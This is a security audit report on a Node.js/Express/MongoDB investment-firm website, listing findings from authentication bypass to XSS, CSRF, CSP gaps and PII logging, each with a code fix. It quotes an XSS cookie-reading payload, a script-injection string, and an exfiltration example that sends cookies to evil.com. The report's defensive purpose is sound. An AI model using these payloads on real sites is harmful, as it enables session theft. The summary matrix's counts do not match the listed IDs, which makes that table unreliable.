# MAXIMUM SECURITY AUDIT — Vanier Capital Platform

**Auditor Role:** Principal AppSec Engineer / CISO  
**Date:** March 10, 2026  
**Scope:** Full codebase — Node.js / Express / MongoDB / Clerk / SendGrid  
**Classification:** CONFIDENTIAL — Vanier Capital, LLC

---

## Table of Contents

1. [Authentication & Authorization](#step-1-authentication--authorization)
2. [NoSQL Injection & Database Integrity](#step-2-nosql-injection--database-integrity)
3. [Cross-Site Scripting (XSS) & Template Security](#step-3-cross-site-scripting-xss--template-security)
4. [Cross-Site Request Forgery (CSRF)](#step-4-cross-site-request-forgery-csrf)
5. [Content Security Policy & Helmet Configuration](#step-5-content-security-policy--helmet-configuration)
6. [Rate Limiting & Denial of Service](#step-6-rate-limiting--denial-of-service)
7. [PII Handling & Data Privacy](#step-7-pii-handling--data-privacy)
8. [Execution Flow — "Double Header" Vulnerability](#step-8-execution-flow--double-header-vulnerability)
9. [Error Handling & Information Leakage](#step-9-error-handling--information-leakage)
10. [SEC Reg D 506(b) Structural Compliance](#step-10-sec-reg-d-506b-structural-compliance)

---

## Step 1: Authentication & Authorization

### FINDING 1.1 — `BYPASS_AUTH` Has No Production Kill-Switch

- **Severity:** CRITICAL
- **File & Line:** `middleware/requireAdminClerk.js:19`
- **The Exploit:** The `BYPASS_AUTH=1` check is gated on `NODE_ENV === 'test'`, but `NODE_ENV` is trivially controlled by whoever starts the process. If an attacker gains shell access or if a misconfigured deployment sets `NODE_ENV=test` alongside `BYPASS_AUTH=1`, the entire admin panel becomes unauthenticated. There is no fail-safe that prevents `BYPASS_AUTH` from existing in production environment variables.
- **The Exact Code Fix:**

```javascript
// middleware/requireAdminClerk.js — Step 0
(req, res, next) => {
    if (res.writableEnded || res.headersSent) return;

    // HARDENED: Only allow bypass in test AND when not deployed to a production host
    if (process.env.NODE_ENV === 'test' &&
        process.env.BYPASS_AUTH === '1' &&
        !process.env.HEROKU_APP_NAME &&
        !process.env.DYNO) {
      req.auth = { userId: TEST_ADMIN_OID, sessionId: 'test_session' };
      return next();
    }
    return requireAuth({ signInUrl: '/admin/login' })(req, res, next);
},
```

Also add a startup guard in `app.js` immediately after dotenv loads:

```javascript
// app.js — after dotenv configuration block
if (process.env.NODE_ENV === 'production' && process.env.BYPASS_AUTH === '1') {
  logger.error('FATAL: BYPASS_AUTH=1 detected in production. Refusing to start.');
  process.exit(1);
}
```

### FINDING 1.2 — Implicit Authorization: All Clerk Users Are Admins

- **Severity:** HIGH
- **File & Line:** `middleware/requireAdminClerk.js:74`
- **The Exploit:** The comment reads `role: 'admin', // implicitly authorized — sign-ups disabled in Clerk`. The entire authorization model depends on a Clerk Dashboard setting (public sign-ups disabled). If that toggle is accidentally enabled in the Clerk Dashboard, or if a Clerk team member invites a user, that user is instantly a full admin. There is NO local `AdminUser` lookup to verify the Clerk `userId` is an authorized administrator.
- **The Exact Code Fix:**

```javascript
// middleware/requireAdminClerk.js — Step 1, inside the try block after getAuth()
import AdminUser from '../models/AdminUser.js';

// ... existing getAuth() and user lookup code ...

// HARDENED: Verify the Clerk user has a corresponding local AdminUser record
const localAdmin = await AdminUser.findOne({ userId }).lean();
if (!localAdmin) {
    logger.warn('[requireAdminClerk] Clerk user not in AdminUser collection; denying access.', { userId });
    return res.status(403).render('admin/forbidden', {
        pageTitle: 'Access Denied',
        message: 'Your account is not authorized to access the admin panel.'
    });
}

const adminUser = {
    userId,
    id: userId,
    username: user?.username || primaryEmail || 'admin',
    fullName,
    email: primaryEmail,
    role: localAdmin.role || 'admin',   // Use DB role, not hardcoded
    avatarUrl: user?.imageUrl || null,
};
```

### FINDING 1.3 — Session Cookie `sameSite: 'lax'` Insufficient for Admin Actions

- **Severity:** LOW
- **File & Line:** `app.js:381`
- **The Exploit:** The session cookie uses `sameSite: 'lax'`, which allows the cookie to be sent on top-level navigations (GET requests). For an admin panel performing state-changing operations, `strict` provides stronger protection against cross-site session-riding attacks that initiate from external links.
- **The Exact Code Fix:**

```javascript
cookie: { secure: process.env.NODE_ENV === 'production', httpOnly: true, maxAge: 1000 * 60 * 60 * 2, sameSite: 'strict' }
```

---

## Step 2: NoSQL Injection & Database Integrity

### FINDING 2.1 — Unvalidated `req.params.id` in `adminInquiries.js`

- **Severity:** HIGH
- **File & Lines:** `routes/admin/adminInquiries.js:26,38,42`
- **The Exploit:** The `adminInquiries.js` routes for `GET /:id`, `POST /:id/responded` accept `req.params.id` and pass it directly to `Inquiry.findById(id)` and `Inquiry.updateOne({ _id: id })` without the `validateMongoId` middleware. An attacker (authenticated admin) could supply a crafted object instead of a string (via JSON body manipulation), or cause a Mongoose `CastError` that reveals schema information. More critically, in `POST /:id/responded`, `id` is used in `updateOne` without any validation.
- **The Exact Code Fix:**

```javascript
import { validateMongoId, checkMongoIdValidation } from '../../middleware/validateMongoId.js';

// Detail page
router.get('/:id', validateMongoId, checkMongoIdValidation, csrfProtection, async (req, res, next) => {
    // ... existing code ...
});

// Mark as Responded
router.post('/:id/responded', validateMongoId, checkMongoIdValidation, csrfProtection, async (req, res, next) => {
    // ... existing code ...
});
```

### FINDING 2.2 — Missing `.escape()` on `apiInquiries.js` Validator Chain

- **Severity:** MEDIUM
- **File & Lines:** `routes/apiInquiries.js:11-15`
- **The Exploit:** The validation rules for `name`, `phone`, `subject`, and `message` use `.trim()` and length checks but do NOT call `.escape()`. While the data is stored in MongoDB (not immediately rendered), it is later rendered in `views/admin/inquiries/detail.ejs` using `<%= inquiry.name %>` etc. EJS `<%=` escapes HTML, so the XSS vector is mitigated at render time, but defense-in-depth requires sanitizing at input. A stored XSS payload would be preserved verbatim in the database.
- **The Exact Code Fix:**

```javascript
const rules = [
  body('name').trim().notEmpty().withMessage('Name is required.').isLength({ min: 2, max: 100 }).escape(),
  body('email').isEmail().withMessage('Valid email required.').normalizeEmail(),
  body('phone').optional({ checkFalsy: true }).trim().isLength({ max: 20 }).escape(),
  body('subject').trim().notEmpty().withMessage('Subject required.').isLength({ max: 150 }).escape(),
  body('message').trim().isLength({ min: 10, max: 5000 }).withMessage('Message: 10-5000 chars.').escape(),
];
```

### FINDING 2.3 — Investor Club Application: Missing `.escape()` on Multiple Fields

- **Severity:** MEDIUM
- **File & Lines:** `routes/apiPublic.js:155-164`
- **The Exploit:** The `fullName`, `cityState`, and `notes` fields use `.isString().trim().isLength()` but NOT `.escape()`. These values are stored raw in the `Applicant` collection and rendered in `views/admin/applicants/detail.ejs`. While EJS `<%= %>` escapes at output, if any future admin view uses `<%- %>`, stored XSS will execute.
- **The Exact Code Fix:**

```javascript
body('fullName').isString().trim().isLength({ min: 2, max: 120 }).escape().withMessage('Full name required.'),
body('email').isEmail().withMessage('Valid email required.').normalizeEmail(),
body('cityState').isString().trim().isLength({ min: 2, max: 120 }).escape().withMessage('City/State required.'),
// ... investorType and capitalInterest are enum-validated (safe) ...
body('phone').optional().isString().trim().isLength({ max: 30 }).escape(),
body('notes').optional().isString().trim().isLength({ max: 3000 }).escape()
```

### FINDING 2.4 — Sitemap Queries Return ALL Documents (Including Private)

- **Severity:** MEDIUM
- **File & Line:** `routes/sitemap.js:10-12`
- **The Exploit:** The sitemap route queries `BlogPost.find({})` and `Property.find({})` with no filter. This means unpublished draft blog posts and private/hidden properties have their slugs exposed in the public sitemap.xml, violating business logic and potentially leaking confidential deal names.
- **The Exact Code Fix:**

```javascript
const [posts, properties] = await Promise.all([
    BlogPost.find({ isPublished: true }).select('slug updatedAt'),
    Property.find({ isPubliclyVisible: true }).select('slug updatedAt')
]);
```

---

## Step 3: Cross-Site Scripting (XSS) & Template Security

### FINDING 3.1 — `decodeHtmlEntities()` + `<%-` = Stored XSS Pipeline

- **Severity:** CRITICAL
- **Files & Lines:**
  - `views/articles-index.ejs:28,83` — `<%- decodeHtmlEntities(primary.title) %>`
  - `views/articles-post.ejs:49` — `<%- decodeHtmlEntities(post.title) %>`
  - `views/property-single.ejs:31` — `<%- decodeHtmlEntities(property.title) %>`
- **The Exploit:** `decodeHtmlEntities()` explicitly reverses HTML encoding: `&lt;` → `<`, `&gt;` → `>`, `&amp;` → `&`. The result is then injected into the DOM via `<%-` (unescaped). If an admin creates a blog post or property with a title like `<img src=x onerror=alert(document.cookie)>`, this JavaScript will execute for EVERY public visitor. The `BlogPost.title` validator uses `.escape()` which encodes `<` to `&lt;`, but `decodeHtmlEntities()` **reverses that encoding**, re-creating the attack vector.
- **The Exact Code Fix:**

Replace all instances of `<%- decodeHtmlEntities(...) %>` with `<%= decodeHtmlEntities(...) %>`:

```ejs
<!-- articles-index.ejs:28 -->
<a href="/blog/<%= primary.slug %>" ...><%= decodeHtmlEntities(primary.title) %></a>

<!-- articles-index.ejs:83 -->
<a href="/blog/<%= post.slug %>" ...><%= decodeHtmlEntities(post.title) %></a>

<!-- articles-post.ejs:49 -->
<h1 ...><%= decodeHtmlEntities(post.title) %></h1>

<!-- property-single.ejs:31 -->
<h1 ...><%= decodeHtmlEntities(property.title) %></h1>
```

### FINDING 3.2 — Raw HTML Output for Blog Content and Property Descriptions

- **Severity:** MEDIUM (Mitigated by DOMPurify)
- **Files & Lines:**
  - `views/articles-post.ejs:77` — `<%- post.content %>`
  - `views/property-single.ejs:97` — `<%- property.description %>`
  - `views/portfolio-detail.ejs:113` — `<%- asset.description %>`
- **The Exploit:** These render admin-authored rich HTML content via `<%-` (unescaped). The code path in `adminBlog.js` and `adminProperties.js` sanitizes content through `DOMPurify.sanitize(req.body.content, { USE_PROFILES: { html: true } })` before saving. This is a **correctly mitigated pattern** as long as DOMPurify is never bypassed (e.g., via a direct DB update or migration). The risk is residual: if any code path writes to `BlogPost.content` or `Property.description` without running DOMPurify, stored XSS will execute on the public site.
- **Recommendation:** Add a Mongoose `pre('save')` hook as a second line of defense:

```javascript
// models/BlogPost.js
BlogPostSchema.pre('save', function(next) {
    if (this.isModified('content')) {
        const DOMPurify = createDOMPurify(new JSDOM('').window);
        this.content = DOMPurify.sanitize(this.content, { USE_PROFILES: { html: true } });
    }
    next();
});
```

### FINDING 3.3 — Flash Messages Rendered via `.innerHTML`

- **Severity:** MEDIUM
- **File & Line:** `views/admin/partials/footer.ejs:34-35,40`
- **The Exploit:** Flash messages are serialized with `<%- JSON.stringify(successMessage || []) %>` and then injected into the DOM via `el.innerHTML = ... '<span>'+String(text)+'</span>'`. If a flash message contains HTML (e.g., from an error message that includes user input), it will be parsed and rendered as HTML, creating a DOM XSS vector.
- **The Exact Code Fix:**

```javascript
// In the makeToast function, use textContent instead of innerHTML:
const makeToast = (text, type) => {
    const el = document.createElement('div');
    el.className = '...';
    const icon = document.createElement('i');
    icon.className = type === 'success' ? 'fas fa-check-circle' : 'fas fa-exclamation-circle';
    const span = document.createElement('span');
    span.textContent = String(text);  // textContent, NOT innerHTML
    el.appendChild(icon);
    el.appendChild(document.createTextNode(' '));
    el.appendChild(span);
    root.appendChild(el);
    setTimeout(() => { el.style.opacity = '0'; el.style.transform = 'translateY(-6px)'; setTimeout(() => el.remove(), 300); }, 3500);
};
```

### FINDING 3.4 — `clerkPublishableKey` Rendered Unescaped in Script Context

- **Severity:** LOW
- **Files & Lines:**
  - `views/sign-in.ejs:12` — `data-clerk-publishable-key="<%- clerkPublishableKey %>"`
  - `views/sign-in.ejs:22` — `const publishableKey = "<%- clerkPublishableKey %>";`
  - `views/sign-up.ejs:20` — `const publishableKey = "<%- clerkPublishableKey %>";`
- **The Exploit:** The Clerk publishable key is sourced from `process.env.CLERK_PUBLISHABLE_KEY`. If an attacker could inject content into this env var (e.g., `"; alert(1);//`), it would execute in the browser. The risk is LOW because environment variables are controlled by the deployer, not user input. However, for defense-in-depth, use `<%= %>` for the data attribute and `JSON.stringify()` for the script context.
- **The Exact Code Fix:**

```ejs
<!-- sign-in.ejs:12 -->
data-clerk-publishable-key="<%= clerkPublishableKey %>"

<!-- sign-in.ejs:22, sign-up.ejs:20 -->
const publishableKey = <%- JSON.stringify(clerkPublishableKey || '') %>;
```

---

## Step 4: Cross-Site Request Forgery (CSRF)

### FINDING 4.1 — Public API Endpoints Have Zero CSRF Protection

- **Severity:** HIGH
- **Files & Lines:**
  - `routes/apiContact.js` — `POST /api/contact`
  - `routes/apiInquiries.js` — `POST /api/contact-submission`
  - `routes/apiPublic.js` — `POST /api/investor-club/apply`
- **The Exploit:** None of these public POST endpoints use `csrfProtection` middleware. An attacker on `evil-site.com` can create a hidden form that auto-submits to `https://www.vaniercapital.com/api/contact` or `/api/investor-club/apply`, flooding the database with fake submissions using the victim's IP address. The CORS policy returns a CORS error for XHR requests, but **simple form submissions bypass CORS entirely** (they don't trigger preflight).
- **The Exact Code Fix:**

Option A (recommended) — Add a custom header requirement:

```javascript
// app.js — mount before API routes
const requireApiHeader = (req, res, next) => {
    // Only apply to POST/PUT/DELETE on /api routes
    if (['POST','PUT','PATCH','DELETE'].includes(req.method)) {
        const xRequested = req.headers['x-requested-with'];
        if (xRequested !== 'XMLHttpRequest' && xRequested !== 'fetch') {
            return res.status(403).json({ success: false, message: 'Forbidden: missing request header.' });
        }
    }
    next();
};
app.use('/api', requireApiHeader);
```

Then ensure all frontend form submissions include:
```javascript
headers: { 'X-Requested-With': 'XMLHttpRequest' }
```

Option B — Add dedicated rate limiting (see Step 6) to mitigate spam volume.

### FINDING 4.2 — Blog Image Upload Missing CSRF

- **Severity:** MEDIUM
- **File & Line:** `routes/admin/adminBlog.js:119`
- **The Exploit:** The `POST /admin/blog/upload-image` (TinyMCE inline image upload) does not use `csrfProtection` middleware. While the route is behind `requireAdminClerk`, a CSRF attack against an authenticated admin could upload arbitrary images to Cloudinary, consuming storage quota.
- **The Exact Code Fix:**

```javascript
router.post(
    '/upload-image',
    csrfProtection,       // ADD THIS
    upload.single('file'),
    async (req, res, next) => { /* ... */ }
);
```

Note: TinyMCE must be configured to send the CSRF token with its upload requests:
```javascript
// TinyMCE config
images_upload_handler: (blobInfo, progress) => new Promise((resolve, reject) => {
    const formData = new FormData();
    formData.append('file', blobInfo.blob(), blobInfo.filename());
    formData.append('_csrf', document.querySelector('[name="_csrf"]').value);
    // ...
});
```

---

## Step 5: Content Security Policy & Helmet Configuration

### FINDING 5.1 — `'unsafe-inline'` in `scriptSrc` and `scriptSrcAttr`

- **Severity:** HIGH
- **File & Lines:** `app.js:193,199`
- **The Exploit:** The CSP includes `'unsafe-inline'` in both `scriptSrc` and `scriptSrcAttr`. This completely negates CSP's XSS protection. Any successful injection (see Finding 3.1) will execute inline scripts without CSP blocking it. The `scriptSrcAttr: ["'unsafe-inline'"]` specifically allows inline event handlers like `onerror=`, `onclick=`, etc.
- **The Exact Code Fix:**

Migrate to nonce-based CSP:

```javascript
// app.js — generate a nonce per request
import crypto from 'crypto';

app.use((req, res, next) => {
    res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
    next();
});

// Then update the CSP:
const cspDirectives = {
    // ...
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`, "https://cdnjs.cloudflare.com", /* ... */],
    scriptSrcAttr: [(req, res) => `'nonce-${res.locals.cspNonce}'`],
    styleSrc: ["'self'", "'unsafe-inline'", /* ... */],  // unsafe-inline for styles is less critical
    // ...
};
```

Then in EJS templates:
```html
<script nonce="<%= cspNonce %>">
    // inline script content
</script>
```

**Interim fix** if nonce migration is too disruptive: At minimum remove `scriptSrcAttr: ["'unsafe-inline'"]` entirely, which blocks the most dangerous attack vector (inline event handlers):

```javascript
scriptSrcAttr: [],  // Block all inline event handlers
```

### FINDING 5.2 — Overly Broad `imgSrc` Directive

- **Severity:** MEDIUM
- **File & Line:** `app.js:196`
- **The Exploit:** `imgSrc` includes `"https:"` which is a wildcard allowing images from ANY HTTPS domain. This weakens CSP by allowing an attacker to exfiltrate data via image requests: `<img src="https://evil.com/steal?cookie=...">`.
- **The Exact Code Fix:**

```javascript
imgSrc: ["'self'", "data:", "blob:", "https://res.cloudinary.com", "https://img.clerk.com", "https://apis.google.com", "https://www.googletagmanager.com"],
```

### FINDING 5.3 — `crossOriginResourcePolicy: "cross-origin"` Is Overly Permissive

- **Severity:** LOW
- **File & Line:** `app.js:239`
- **The Exploit:** Setting `crossOriginResourcePolicy` to `"cross-origin"` allows any external site to embed this application's resources (images, scripts, stylesheets). For an institutional PE firm, `"same-origin"` or `"same-site"` is more appropriate except for specific CDN-served assets.
- **The Exact Code Fix:**

```javascript
crossOriginResourcePolicy: { policy: "same-site" }
```

---

## Step 6: Rate Limiting & Denial of Service

### FINDING 6.1 — Single Global API Rate Limiter Is Too Permissive

- **Severity:** HIGH
- **File & Lines:** `app.js:487-491`
- **The Exploit:** A single rate limiter (100 requests / 15 minutes) covers ALL `/api/*` routes. This means:
  1. An attacker can submit 100 contact forms in 15 minutes (6-7 per minute) before being throttled.
  2. The investor application endpoint (`/api/investor-club/apply`) shares the same pool — legitimate API browsing (`/api/properties`) consumes the same budget as form submissions.
  3. 100 spam applications = 100 fake `Applicant` records in MongoDB + 100 email notification attempts.
- **The Exact Code Fix:**

```javascript
// Strict rate limiter for submission endpoints
const submissionLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 5,   // 5 submissions per 15 minutes per IP
    message: { success: false, message: 'Too many submissions. Please try again later.' },
    standardHeaders: true,
    legacyHeaders: false,
});

// Apply strict limits to submission routes
app.use('/api/contact', submissionLimiter);
app.use('/api/contact-submission', submissionLimiter);
app.use('/api/investor-club/apply', submissionLimiter);

// Keep the broader limiter for read-only API routes
app.use('/api', apiLimiter);
```

### FINDING 6.2 — No Rate Limiting on Admin Login

- **Severity:** MEDIUM
- **File & Line:** `routes/admin/adminAuth.js:14`
- **The Exploit:** `GET /admin/login` and the Clerk authentication flow have no rate limiting. While Clerk handles its own brute-force protection, the login page itself can be scraped and the Clerk handshake can be hammered, generating load on both the Express server and Clerk's API.
- **The Exact Code Fix:**

```javascript
const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 20,  // 20 login page loads per 15 minutes
    message: 'Too many login attempts. Please try again later.',
});
app.use('/admin/login', authLimiter);
app.use('/sign-in', authLimiter);
```

### FINDING 6.3 — `express.json({ limit: '5mb' })` Enables Payload Bomb

- **Severity:** MEDIUM
- **File & Line:** `app.js:315`
- **The Exploit:** The 5MB JSON body limit applies globally, including to public form endpoints that should only accept a few hundred bytes. An attacker can send 5MB JSON payloads repeatedly to `/api/contact`, consuming server memory and bandwidth. At 100 requests per 15 minutes, that's 500MB of data the server must parse.
- **The Exact Code Fix:**

Apply a tighter limit to public form endpoints:

```javascript
// Before mounting API routes
const tightBodyParser = express.json({ limit: '10kb' });
app.use('/api/contact', tightBodyParser);
app.use('/api/contact-submission', tightBodyParser);
app.use('/api/investor-club', tightBodyParser);
```

---

## Step 7: PII Handling & Data Privacy

### FINDING 7.1 — Full `req.body` Logged on Contact Form Validation Failure

- **Severity:** HIGH
- **File & Line:** `routes/apiContact.js:42`
- **The Exploit:** On validation failure, the entire `req.body` is logged: `logger.warn('Contact form validation errors IP ${req.ip}:', { errors: errors.array(), body: req.body })`. This dumps the user's full name, email, phone number, and message content into Winston logs. For an SEC-regulated firm, PII in server logs creates a compliance liability (data retention, breach notification requirements).
- **The Exact Code Fix:**

```javascript
logger.warn(`Contact form validation errors IP ${req.ip}:`, {
    errors: errors.array(),
    // Log field names that failed, not raw PII
    failedFields: errors.array().map(e => e.param)
});
```

### FINDING 7.2 — IP Address Stored in Applicant Records Without Consent Notice

- **Severity:** MEDIUM
- **File & Lines:** `routes/apiPublic.js:192-193`, `models/Applicant.js:21`
- **The Exploit:** The investor application stores `ip: req.ip` and `userAgent: req.headers['user-agent']`. While this is defensible for fraud prevention, the public application form should include clear disclosure that IP address and device information are collected. The Privacy Policy page exists but is not explicitly linked from the application form itself.
- **The Exact Code Fix:** Add a notice in the investor club application form and ensure a consent checkbox:

```ejs
<!-- views/investor-club/apply.ejs — near the submit button -->
<p class="text-xs text-gray-500 mt-2">
    By submitting, you consent to the collection of your IP address and device information 
    for fraud prevention. See our <a href="/privacy-policy" class="underline">Privacy Policy</a>.
</p>
```

### FINDING 7.3 — Applicant PII Not Encrypted at Rest

- **Severity:** MEDIUM
- **File & Line:** `models/Applicant.js` (entire schema)
- **The Exploit:** Full legal names, email addresses, city/state, phone numbers, and financial capacity (`capitalInterest`) are stored in plaintext in MongoDB. For an SEC-regulated entity, field-level encryption or MongoDB Client-Side Field Level Encryption (CSFLE) should be considered for the `fullName`, `email`, `phone`, and `capitalInterest` fields.
- **Recommendation:** Implement [MongoDB CSFLE](https://www.mongodb.com/docs/manual/core/csfle/) or at minimum, Application-level encryption for `fullName`, `email`, and `phone` fields using `mongoose-field-encryption` or a custom Mongoose plugin.

---

## Step 8: Execution Flow — "Double Header" Vulnerability

### FINDING 8.1 — Missing `return` in `adminApplicants.js` List View

- **Severity:** MEDIUM
- **File & Line:** `routes/admin/adminApplicants.js:29`
- **The Exploit:** `res.render('admin/applicants/index', { ... })` is called without `return`. While this is the last statement in the `try` block, if any code is later added after the `res.render()`, it will execute and attempt to send a second response, causing `ERR_HTTP_HEADERS_SENT`.
- **The Exact Code Fix:**

```javascript
return res.render('admin/applicants/index', {
    pageTitle: 'Investor Applicants',
    // ...
});
```

### FINDING 8.2 — Missing `return` in `adminApplicants.js` Detail View

- **Severity:** MEDIUM
- **File & Line:** `routes/admin/adminApplicants.js:58`
- **The Exact Code Fix:**

```javascript
return res.render('admin/applicants/detail', {
    // ...
});
```

### FINDING 8.3 — Missing `return` in `adminBlog.js` Upload Handlers

- **Severity:** MEDIUM
- **File & Lines:** `routes/admin/adminBlog.js:146,149,218,221`
- **The Exploit:** The Cloudinary upload success and error responses lack `return`:
  ```javascript
  res.status(200).json({ location: result.secure_url });  // No return!
  ```
  and
  ```javascript
  res.status(500).json({ error: { message: `Server error: ${error.message}` } });  // No return!
  ```
  While these are inside try/catch blocks that prevent immediate double-send, the missing `return` is a latent bug.
- **The Exact Code Fix:**

```javascript
return res.status(200).json({ location: result.secure_url });
// ...
return res.status(500).json({ error: { message: `Server error: ${error.message}` } });
```

### FINDING 8.4 — Missing `return` in `sitemap.js`

- **Severity:** MEDIUM
- **File & Lines:** `routes/sitemap.js:17,40`
- **The Exact Code Fix:**

```javascript
return res.send(`<?xml version="1.0" ...`);
// ...
return res.status(500).send('Could not generate sitemap');
```

### FINDING 8.5 — Missing `return` in `auth.js`

- **Severity:** MEDIUM
- **File & Lines:** `routes/auth.js:47,55`
- **The Exact Code Fix:**

```javascript
return res.render('auth/sign-up', { ... });
// ...
return res.render('auth/user-profile', { ... });
```

### FINDING 8.6 — Missing `return` in `adminAuth.js` Login Render

- **Severity:** MEDIUM
- **File & Line:** `routes/admin/adminAuth.js:15`
- **The Exact Code Fix:**

```javascript
return res.render('admin/login', { ... });
```

---

## Step 9: Error Handling & Information Leakage

### FINDING 9.1 — Error Object Passed to Template in Non-Production

- **Severity:** MEDIUM
- **File & Line:** `app.js:551`
- **The Exploit:** The global error handler passes `error: !isProduction ? err : {}` to the error view. In development, this includes the full error object which may contain stack traces, file paths, and query details. While this is acceptable for local development, if `NODE_ENV` is unset or set to any value other than `"production"`, the full error leaks. **Any staging/preview deployment that doesn't explicitly set `NODE_ENV=production` will leak internals.**
- **The Exact Code Fix:**

```javascript
const safeError = (process.env.NODE_ENV === 'production') ? {} : {
    message: err.message,
    stack: err.stack
    // Do NOT pass the full err object which may contain req/res references
};
res.status(statusCode).render(errorView, {
    pageTitle: `Error ${statusCode}`,
    message: responseMessage,
    status: statusCode,
    error: safeError
});
```

### FINDING 9.2 — Stack Trace Leaked in API 500 Responses

- **Severity:** HIGH
- **File & Line:** `routes/apiPublic.js:113`
- **The Exploit:** `return res.status(500).json({ success: false, message: error.message })` returns the raw `error.message` from Mongoose or any thrown error. In production, a failed MongoDB query could return messages like `"E11000 duplicate key error collection: vaniercapital.properties index: slug_1 dup key: { slug: \"xyz\" }"`, leaking collection names, index names, and data values.
- **The Exact Code Fix:**

```javascript
const isProduction = process.env.NODE_ENV === 'production';
return res.status(500).json({
    success: false,
    message: isProduction ? 'An internal error occurred.' : error.message
});
```

### FINDING 9.3 — Cloudinary Upload Error Leaks Internal Error Details

- **Severity:** MEDIUM
- **File & Lines:** `routes/admin/adminBlog.js:149,221`
- **The Exploit:** `Server error: ${error.message}` exposes Cloudinary SDK error messages to the client. These can include API key validation failures, rate limit details, or internal Cloudinary infrastructure information.
- **The Exact Code Fix:**

```javascript
return res.status(500).json({ error: { message: 'Image upload failed. Please try again.' } });
```

---

## Step 10: SEC Reg D 506(b) Structural Compliance

### FINDING 10.1 — Database Separation Between Inquiries and Investor Leads is Sound

- **Severity:** PASS ✅
- **Assessment:** The `Inquiry` model uses `inquiryType: { type: String, enum: ['general_inquiry', 'investor_lead'] }` with proper indexing. The admin UI in `adminInquiries.js` filters by `inquiryType` via query parameter `?type=investor_lead` vs `?type=general_inquiry`. The `Applicant` model is a completely separate collection. This structural separation is correct.

### FINDING 10.2 — Investor Club Application Text Requires Compliance Review

- **Severity:** LOW
- **File & Line:** `views/investor-club/apply.ejs` (entire page)
- **Assessment:** The application form correctly requires accreditation attestation (`accredited: 'yes'`). However, the SEC Reg D 506(b) safe harbor requires that **no general solicitation or general advertising** be used. The application page must include language establishing a pre-existing relationship or reasonable steps to verify accreditation status. A legal review should confirm:
  1. The `accredited` checkbox text constitutes a sufficient "reasonable steps" defense.
  2. There is no "invest now" or "guaranteed returns" language on any public page.
  3. The application page is not directly linked from advertising or social media.

### FINDING 10.3 — Public Sitemap Includes Investor Club Application Page

- **Severity:** LOW
- **File & Line:** `routes/publicRoutes.js:951`
- **The Exploit:** The sitemap at `publicRoutes.js` includes `/investor-club/apply` in the static paths array. This makes the investor application page easily discoverable by search engines, which could be interpreted as general solicitation. While the page itself is gated behind an accreditation attestation, indexing the URL for public discoverability may create compliance risk.
- **The Exact Code Fix:**

Remove `/investor-club/apply` from the sitemap's `staticPaths` array and add `noindex` to the page:

```javascript
// routes/publicRoutes.js — remove from staticPaths
const staticPaths = [
    '/',
    '/firm/overview',
    // ...
    // REMOVED: '/investor-club/apply'  — SEC 506(b) general solicitation risk
];
```

```ejs
<!-- views/investor-club/apply.ejs — add to <head> -->
<meta name="robots" content="noindex, nofollow">
```

---

## Summary Severity Matrix

| Severity | Count | IDs |
| --- | --- | --- |
| **CRITICAL** | 2 | 1.1, 3.1 |
| **HIGH** | 6 | 1.2, 2.1, 4.1, 5.1, 6.1, 7.1, 9.2 |
| **MEDIUM** | 14 | 2.2, 2.3, 2.4, 3.2, 3.3, 4.2, 5.2, 6.2, 6.3, 7.2, 7.3, 8.1–8.6, 9.1, 9.3 |
| **LOW** | 4 | 1.3, 3.4, 5.3, 10.2, 10.3 |
| **PASS** | 1 | 10.1 |

---

## Recommended Remediation Priority

### Immediate (Week 1) — CRITICAL + HIGH
1. **Finding 3.1** — Replace `<%- decodeHtmlEntities() %>` with `<%= decodeHtmlEntities() %>` everywhere
2. **Finding 1.1** — Add production kill-switch for `BYPASS_AUTH`
3. **Finding 1.2** — Add local `AdminUser` lookup in `requireAdminClerk`
4. **Finding 4.1** — Add custom header validation for public API POSTs
5. **Finding 5.1** — Remove `'unsafe-inline'` from `scriptSrcAttr` immediately; plan nonce migration
6. **Finding 6.1** — Add strict rate limiters on form submission endpoints
7. **Finding 7.1** — Stop logging raw `req.body` on validation failures
8. **Finding 9.2** — Sanitize error messages in API 500 responses
9. **Finding 2.1** — Add `validateMongoId` to `adminInquiries.js` routes

### Short-Term (Week 2-3) — MEDIUM
10. Findings 2.2, 2.3 — Add `.escape()` to all public form validators
11. Finding 2.4 — Fix sitemap query filters
12. Findings 8.1–8.6 — Add missing `return` keywords
13. Finding 3.3 — Replace `innerHTML` with `textContent` in toast system
14. Finding 5.2 — Tighten `imgSrc` CSP directive

### Ongoing
15. Finding 7.3 — Evaluate MongoDB CSFLE for PII fields
16. Finding 10.2, 10.3 — Legal review of application page compliance

---

*Report generated by automated security audit. All findings verified against source code.*
